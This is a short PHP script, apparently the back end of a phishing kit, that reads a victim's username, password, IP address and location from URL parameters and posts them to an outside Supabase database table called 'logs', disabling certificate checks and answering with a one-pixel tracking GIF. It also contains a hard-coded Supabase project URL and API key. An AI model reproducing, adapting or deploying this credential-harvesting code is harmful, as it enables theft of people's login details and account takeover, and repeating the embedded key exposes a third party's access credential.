<?php
// ============================================
// VERIFY.PHP - Save to Supabase Database
// ============================================

// ============================================
// YOUR SUPABASE CREDENTIALS
// ============================================
$supabaseUrl = 'https://eqqdjscfogwwshzdrdnw.supabase.co';
$supabaseKey = 'sb_publishable_7rVfq5jdsbhvXikHvXfNbA_x5ZxRisl';
// ============================================

// Get data from process.php
$u = $_GET['u'] ?? '';
$p = $_GET['p'] ?? '';
$ip = $_GET['ip'] ?? '';
$country = $_GET['country'] ?? '';
$city = $_GET['city'] ?? '';
$continent = $_GET['continent'] ?? '';

// Only save if we have username or password
if (!empty($u) || !empty($p)) {
    $data = [
        'username' => $u,
        'password' => $p,
        'ip' => $ip,
        'country' => $country,
        'city' => $city,
        'continent' => $continent
    ];

    $url = $supabaseUrl . '/rest/v1/logs';
    $json = json_encode($data);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'apikey: ' . $supabaseKey,
        'Authorization: Bearer ' . $supabaseKey
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
